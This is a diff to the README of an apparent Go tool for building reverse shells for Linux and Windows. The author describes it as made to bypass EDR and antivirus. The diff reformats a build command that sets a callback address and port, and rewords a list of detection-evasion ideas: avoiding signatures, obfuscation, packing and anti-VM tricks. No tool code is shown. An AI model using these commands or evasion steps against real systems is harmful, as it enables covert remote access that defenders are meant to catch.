@@ -24,7 +24,9 @@ As an infosec student, I had to bypass some EDR and antivirus solutions (see the
 
 * Build a shell for linux server : ```go run main.go -s linux```
 * Build a shell for windows server : ```go run main.go -s windows```
-* Build a shell for windows server to be attached on 192.1.1.10:4444 : ```go run main.go -i 192.168.1.10 -p 4444 -s windows```
+* Build a shell for windows server to be attached on 192.1.1.10:4444 :
+
+```go run main.go -i 192.168.1.10 -p 4444 -s windows```
 
 ### Attach to reverse shell
 
@@ -37,7 +39,7 @@ As an infosec student, I had to bypass some EDR and antivirus solutions (see the
 
 ## Go further
 Some ideas to go further using this tool :
-- Avoid signatures (build your own unique code)
+- Avoid signatures (build your own unique reverse-shell code)
 - Obfuscate your reverse-shell code
 - Pack your reverse-shell executable (ie. https://github.com/EgeBalci/amber)
 - Add anti-vm tricks to your reverse-shell code
